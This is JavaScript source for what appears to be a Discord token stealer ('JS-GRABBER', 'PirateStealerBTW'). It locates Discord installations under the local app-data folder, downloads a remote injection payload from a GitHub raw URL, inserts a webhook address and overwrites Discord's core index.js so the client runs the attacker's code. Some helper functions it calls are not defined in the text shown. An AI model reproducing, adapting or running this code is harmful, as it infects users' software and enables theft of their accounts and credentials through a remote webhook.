var glob = require("glob");
const fs = require('fs');
const https = require('https');
const { exec } = require('child_process');
const buf_replace = require('buffer-replace');
const webhook = "da_webhook"


var LOCAL = process.env.LOCALAPPDATA
var discords = [];
var injectPath = [];
var runningDiscords = [];
fs.readdirSync(LOCAL).forEach(file => {
    if (file.includes("iscord")) {
        discords.push(LOCAL + '\\' + file)
    } else {
        return;
    }
});
discords.forEach(function(file) {
    let pattern = `${file}` + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js"
    glob.sync(pattern).map(file => {
        injectPath.push(file)
        listDiscords();
    })
});
function Infect() {
    https.get('https://raw.githubusercontent.com/Scars1337x/JS-GRABBER/main/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook), {
                    encoding: 'utf8',
                    flag: 'w'
                });
                let folder = file.replace("index.js", "PirateStealerBTW")
                if (!fs.existsSync(folder)) {
                    fs.mkdirSync(folder, 0744)
                    startDiscord();
                }
            })
        });
    }).on("error", (err) => {
        console.log(err);
    });
};
